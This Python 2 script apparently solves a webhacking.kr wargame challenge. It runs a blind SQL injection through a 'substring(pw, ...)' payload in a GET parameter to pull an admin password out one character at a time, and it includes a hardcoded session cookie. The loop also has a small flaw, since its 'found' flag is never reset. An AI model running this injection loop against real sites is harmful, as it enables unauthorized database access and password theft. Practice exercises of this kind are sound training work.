import requests

url = "http://webhacking.kr/challenge/bonus/bonus-1/index.php"

headers = {
	"Cookie": "oldzombie=1; PHPSESSID=8aa8b01919b86d9a80f524a71c187ce9",
	"Host": "webhacking.kr"
}

# GET
# length(id) = 5

tables = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_+"

found = False
ans_id = ""

for i in range(1, 40):
	for ch in range(0x41, 0x7f):
		params = {
			"no": "2 and substring(pw, %d, 1)=0x%x" % (i, ch),
			"id": "admin",
			"pw": ""
		}

		req = requests.get(url, headers=headers, params=params)
		
		res = req.content.split("Result : <b>")[1].split("</b>")[0].replace("\n","")

		print "[%c : %02x] is " % (ch, ch),

		if res == "True":
			print "True"
			found = True
			ans_id = ans_id + chr(ch) # ord('a') => 0x61, char -> integer
			# chr(0x61) => 'a', integer -> char
			break
		else:
			print "False"

	if found == False:
		print "Not found"
		exit(0)
	else:
		print "Found it!!!! password is : " + ans_id
